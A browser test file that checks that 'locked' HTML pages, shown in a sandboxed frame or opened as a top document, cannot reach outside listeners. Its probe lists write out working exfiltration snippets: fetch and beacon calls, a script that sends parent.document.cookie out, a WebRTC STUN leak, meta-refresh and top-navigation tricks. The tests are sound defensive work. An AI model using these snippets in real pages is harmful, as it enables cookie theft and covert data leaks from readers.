/**
 * A Squire's page is published locked (`lockedHtmlRenderDocument`). Every
 * probe below runs on an ordinary page and on a locked page at once, each
 * aimed at its own listener: the ordinary page reaching its listener proves
 * the probe works, and the locked page must reach nothing. Pages are served
 * with the asset route's headers and shown through the real `HtmlRenderFrame`,
 * or opened as the top document, as mobile and older clients show them.
 */
import { EnvironmentId, ThreadId } from "@lecturn/contracts";
import {
  HTML_RENDER_DEFAULT_FONTS,
  htmlRenderTheme,
  injectHtmlRenderBootstrap,
  lockedHtmlRenderDocument,
  type HtmlRenderTheme,
} from "@lecturn/shared/htmlRender";
import { STANDARD_DARK_THEME_COLORS } from "@lecturn/shared/themePalettes";
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterAll, afterEach, beforeAll, beforeEach, expect, it, vi } from "vite-plus/test";
import { commands, userEvent } from "vite-plus/test/browser";

import "~/index.css";

import { HtmlRenderFrame } from "./HtmlRenderFrame";

type Kind = "ordinary" | "locked";
interface Hits {
  readonly requests: ReadonlyArray<string>;
  readonly datagrams: number;
}

/** The commands in `apps/web/test/htmlRenderLeakCommands.ts`. */
interface LeakCommands {
  readonly htmlRenderLeakStart: () => Promise<{
    readonly documentOrigin: string;
    readonly ordinary: { readonly origin: string; readonly stunPort: number };
    readonly locked: { readonly origin: string; readonly stunPort: number };
  }>;
  readonly htmlRenderLeakServe: (id: string, html: string) => Promise<string>;
  readonly htmlRenderLeakHits: () => Promise<Record<Kind, Hits>>;
  readonly htmlRenderLeakStop: () => Promise<void>;
}
const leak = commands as typeof commands & LeakCommands;

const { urls, theme, openLink } = vi.hoisted(() => ({
  urls: new Map<string, string>(),
  theme: { current: undefined as HtmlRenderTheme | undefined },
  openLink: vi.fn<(url: string) => Promise<void>>(),
}));
vi.mock(import("~/assets/assetUrls"), async (original) => ({
  ...(await original()),
  useAssetUrlState: (_environmentId, resource) => ({
    _tag: "Success" as const,
    url:
      urls.get(resource !== null && "attachmentId" in resource ? resource.attachmentId : "") ??
      "about:blank",
    expiresAt: Date.now() + 60 * 60_000,
  }),
  useAssetUrlRefresh: () => vi.fn(),
}));
vi.mock(import("~/browser/useOpenLink"), async (original) => ({
  ...(await original()),
  useOpenLink: () => openLink,
}));
vi.mock(import("~/hooks/useHtmlRenderTheme"), async (original) => ({
  ...(await original()),
  useHtmlRenderTheme: () => theme.current!,
}));

const darkTheme = htmlRenderTheme(STANDARD_DARK_THEME_COLORS, "dark", HTML_RENDER_DEFAULT_FONTS);
const withRadius = (radius: string): HtmlRenderTheme => ({
  ...darkTheme,
  variables: { ...darkTheme.variables, "--radius": radius },
});

let origins: Awaited<ReturnType<typeof leak.htmlRenderLeakStart>>;
let root: Root;
let container: HTMLDivElement;
const popups: Array<Window> = [];
let served = 0;

beforeAll(async () => {
  origins = await leak.htmlRenderLeakStart();
});

afterAll(async () => {
  await leak.htmlRenderLeakStop();
});

beforeEach(() => {
  theme.current = darkTheme;
  openLink.mockReset().mockResolvedValue(undefined);
  container = document.createElement("div");
  container.style.width = "480px";
  document.body.append(container);
  root = createRoot(container);
});

afterEach(async () => {
  await act(() => root.unmount());
  container.remove();
  for (const popup of popups.splice(0)) popup.close();
});

// Until a page reports its height the frame keeps the published 2000px, so a
// smaller frame shows the page loaded and its bootstrap ran.
const UNREPORTED_HEIGHT = "2000px";

const pageFor = (probe: string, kind: Kind) => {
  const { origin, stunPort } = origins[kind];
  const body = probe.replaceAll("{L}", origin).replaceAll("{U}", String(stunPort));
  return `<!doctype html><html><head><title>Probe</title></head><body><div style="height:100px">probe</div>${body}</body></html>`;
};

const publish = async (html: string, kind: Kind) => {
  served += 1;
  const id = `page-${served}`;
  const document =
    kind === "locked"
      ? await lockedHtmlRenderDocument(html, "Probe")
      : injectHtmlRenderBootstrap(html);
  urls.set(id, await leak.htmlRenderLeakServe(id, document));
  return id;
};

const threadRef = {
  environmentId: EnvironmentId.make("environment"),
  threadId: ThreadId.make("thread"),
};

/** Shows both pages through `HtmlRenderFrame`, side by side. */
async function showInThread(pages: Record<Kind, string>) {
  const ids = {
    ordinary: await publish(pages.ordinary, "ordinary"),
    locked: await publish(pages.locked, "locked"),
  };
  const render = () =>
    act(async () =>
      root.render(
        <>
          {(["ordinary", "locked"] as const).map((kind) => (
            <div key={kind} data-kind={kind}>
              <HtmlRenderFrame
                environmentId={threadRef.environmentId}
                htmlRender={{ attachmentId: ids[kind], title: kind, height: 2000 }}
                threadRef={threadRef}
              />
            </div>
          ))}
        </>,
      ),
    );
  await render();
  const frameOf = (kind: Kind) =>
    container.querySelector<HTMLIFrameElement>(`[data-kind="${kind}"] iframe`)!;
  const boxOf = (kind: Kind) => frameOf(kind).parentElement!;
  return { frameOf, boxOf, render };
}

const hitsOf = async (kind: Kind) => (await leak.htmlRenderLeakHits())[kind];

const reached = (hits: Hits, path: string) =>
  path === "udp" ? hits.datagrams > 0 : hits.requests.some((url) => url.startsWith(path));

// Each probe's own path, so a late hit from an earlier probe cannot count.
const CLIENT_PROBES: ReadonlyArray<readonly [name: string, probe: string, path: string]> = [
  ["fetch", '<script>fetch("{L}/fetch")</script>', "/fetch"],
  [
    "XMLHttpRequest",
    '<script>var x=new XMLHttpRequest();x.open("GET","{L}/xhr");x.send()</script>',
    "/xhr",
  ],
  [
    "WebSocket",
    '<script>new WebSocket("{L}/websocket".replace("http","ws"))</script>',
    "/websocket",
  ],
  ["sendBeacon", '<script>navigator.sendBeacon("{L}/beacon","data")</script>', "/beacon"],
  ["EventSource", '<script>new EventSource("{L}/event-source")</script>', "/event-source"],
  ["new Image()", '<script>new Image().src="{L}/new-image"</script>', "/new-image"],
  ["CSS url()", '<div style="height:4px;background:url({L}/css-url)"></div>', "/css-url"],
  ["srcset", '<img alt="" srcset="{L}/srcset 1x">', "/srcset"],
  ['<link rel="prefetch">', '<link rel="prefetch" href="{L}/prefetch">', "/prefetch"],
  ["location assignment", '<script>location.href="{L}/location"</script>', "/location"],
  ["meta refresh", '<meta http-equiv="refresh" content="0;url={L}/meta-refresh">', "/meta-refresh"],
  ["nested iframe", '<iframe src="{L}/nested-iframe"></iframe>', "/nested-iframe"],
  [
    "nested srcdoc iframe navigating itself",
    `<iframe srcdoc="<meta http-equiv=refresh content='0;url={L}/nested-refresh'>"></iframe>`,
    "/nested-refresh",
  ],
  [
    "parent DOM access and document.domain",
    '<script>try{document.domain="127.0.0.1";fetch("{L}/parent-dom?"+parent.document.cookie)}catch(e){fetch("{L}/parent-dom-blocked")}</script>',
    "/parent-dom",
  ],
  ["inline event handler", `<img alt="" src="data:," onerror="fetch('{L}/handler')">`, "/handler"],
  [
    "WebRTC (outside CSP)",
    '<script>var p=new RTCPeerConnection({iceServers:[{urls:"stun:127.0.0.1:{U}"}]});p.createDataChannel("d");p.createOffer().then(function(o){p.setLocalDescription(o)})</script>',
    "udp",
  ],
];

it.each(CLIENT_PROBES)(
  "a locked page in the thread cannot leak through %s",
  async (_, probe, path) => {
    const { boxOf } = await showInThread({
      ordinary: pageFor(probe, "ordinary"),
      locked: pageFor(probe, "locked"),
    });
    await expect
      .poll(async () => reached(await hitsOf("ordinary"), path), { timeout: 10_000 })
      .toBe(true);
    await expect.poll(() => boxOf("locked").style.height).not.toBe(UNREPORTED_HEIGHT);
    expect(reached(await hitsOf("locked"), path)).toBe(false);
  },
);

// A trusted click on the frame lands on whatever page content fills it.
const FULL_SIZE = "position:fixed;inset:0;display:block;width:100%;height:100%";

const formHits = async (kind: Kind) =>
  (await hitsOf(kind)).requests.filter((url) => url.startsWith("/form")).length;

it("a locked page cannot submit a form the reader clicks", async () => {
  const probe = `<form action="{L}/form" method="get"><button style="${FULL_SIZE}">Send</button></form>`;
  const pages = { ordinary: pageFor(probe, "ordinary"), locked: pageFor(probe, "locked") };
  const { frameOf, boxOf } = await showInThread(pages);
  await expect.poll(() => boxOf("locked").style.height).not.toBe(UNREPORTED_HEIGHT);
  await expect.poll(() => boxOf("ordinary").style.height).not.toBe(UNREPORTED_HEIGHT);
  // The locked page is clicked first, so its submission would land no later than the control's.
  await userEvent.click(frameOf("locked"));
  await userEvent.click(frameOf("ordinary"));
  await expect.poll(() => formHits("ordinary"), { timeout: 10_000 }).toBe(1);
  expect(await formHits("locked")).toBe(0);
});

// A link's ping goes out only with a navigation, and a framed page's link click
// never navigates: it asks the client by postMessage, which is the control here.
it("a locked page cannot get the client to open a link, or ping, when the reader clicks it", async () => {
  const probe = `<a href="{L}/link" ping="{L}/ping" style="${FULL_SIZE}">Open</a>`;
  const pages = { ordinary: pageFor(probe, "ordinary"), locked: pageFor(probe, "locked") };
  const { frameOf, boxOf } = await showInThread(pages);
  await expect.poll(() => boxOf("locked").style.height).not.toBe(UNREPORTED_HEIGHT);
  await expect.poll(() => boxOf("ordinary").style.height).not.toBe(UNREPORTED_HEIGHT);
  // The ordinary page asks the client by postMessage, which opens the link.
  await userEvent.click(frameOf("ordinary"));
  await expect.poll(() => openLink.mock.calls.length).toBe(1);
  expect(openLink.mock.calls[0]?.[0]).toBe(`${origins.ordinary.origin}/link`);
  await userEvent.click(frameOf("locked"));
  // The locked page's message stops at its wrapper; a later ordinary click still opens.
  await userEvent.click(frameOf("ordinary"));
  await expect.poll(() => openLink.mock.calls.length).toBe(2);
  expect(openLink.mock.calls.map(([url]) => url)).not.toContain(`${origins.locked.origin}/link`);
  const locked = await hitsOf("locked");
  expect(reached(locked, "/ping") || reached(locked, "/link")).toBe(false);
});

// Mobile loads a page as the top document of its WebView, where a page could
// navigate the whole view or open windows; ordinary pages may.
const TOP_LEVEL_PROBES: ReadonlyArray<readonly [name: string, probe: string, path: string]> = [
  ["window.open", '<script>window.open("{L}/window-open")</script>', "/window-open"],
  ["top navigation", '<script>top.location.href="{L}/top-navigation"</script>', "/top-navigation"],
  ["location assignment", '<script>location.href="{L}/top-location"</script>', "/top-location"],
  ["meta refresh", '<meta http-equiv="refresh" content="0;url={L}/top-refresh">', "/top-refresh"],
];

async function openAsTopDocument(url: string) {
  const button = document.createElement("button");
  button.textContent = "Open";
  button.addEventListener("click", () => {
    const popup = window.open(url, "_blank");
    if (popup) popups.push(popup);
  });
  container.append(button);
  // A trusted click, since a window needs the reader's activation to open.
  await userEvent.click(button);
  button.remove();
}

it.each(TOP_LEVEL_PROBES)(
  "a locked page shown as the top document cannot leak through %s",
  async (_, probe, path) => {
    const ordinary = urls.get(await publish(pageFor(probe, "ordinary"), "ordinary"))!;
    const locked = urls.get(await publish(pageFor(probe, "locked"), "locked"))!;
    await openAsTopDocument(locked);
    await openAsTopDocument(ordinary);
    expect(popups).toHaveLength(2);
    await expect
      .poll(async () => reached(await hitsOf("ordinary"), path), { timeout: 10_000 })
      .toBe(true);
    // The wrapper has built its page frame: the count of a window's frames reads across origins.
    await expect.poll(() => popups[0]!.length).toBe(1);
    expect(reached(await hitsOf("locked"), path)).toBe(false);
  },
);

it("fits the frame to a locked page and follows the client's theme", async () => {
  theme.current = withRadius("3px");
  const page = '<div style="height:calc(var(--radius) * 100)"></div>';
  const { boxOf, render } = await showInThread({ ordinary: page, locked: page });
  // The wrapper themes the page from the URL fragment and passes its height up.
  await expect.poll(() => boxOf("locked").style.height).toBe("300px");
  await expect.poll(() => boxOf("ordinary").style.height).toBe("300px");
  // A live theme change reaches the page through the wrapper.
  theme.current = withRadius("2px");
  await render();
  await expect.poll(() => boxOf("locked").style.height).toBe("200px");
  await expect.poll(() => boxOf("ordinary").style.height).toBe("200px");
});
